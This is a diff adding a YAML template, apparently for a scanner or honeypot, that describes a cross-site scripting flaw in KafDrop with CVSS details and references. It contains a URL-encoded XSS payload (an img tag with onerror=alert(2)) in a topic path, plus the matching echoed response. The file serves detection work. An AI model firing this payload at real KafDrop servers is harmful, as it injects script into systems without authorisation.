@@ -1,0 +1,28 @@
+id: kafdrop-xss
+info:
+  name: KafDrop - Cross-Site Scripting
+  author: dhiyaneshDk
+  description: KafDrop contains a cross-site scripting vulnerability. It allows remote
+    unauthenticated attackers to inject arbitrary HTML and/or JavaScript into the
+    response returned by the server.
+  severity: high
+  reference:
+  - https://github.com/HomeAdvisor/Kafdrop/issues/12
+  - https://www.blackhatethicalhacking.com/news/apache-kafka-cloud-clusters-expose-sensitive-data-for-large-companies
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  metadata:
+    max-request: 1
+  tags: kafdrop,xss
+traps:
+- request:
+    method: GET
+    path: /topic/e'%22%3E%3Cimg%20src=x%20onerror=alert(2)%3E
+    headers: null
+    body: null
+  response:
+    status_code: 500
+    headers: {}
+    body: Kafdrop<img src=x onerror=alert(2)>
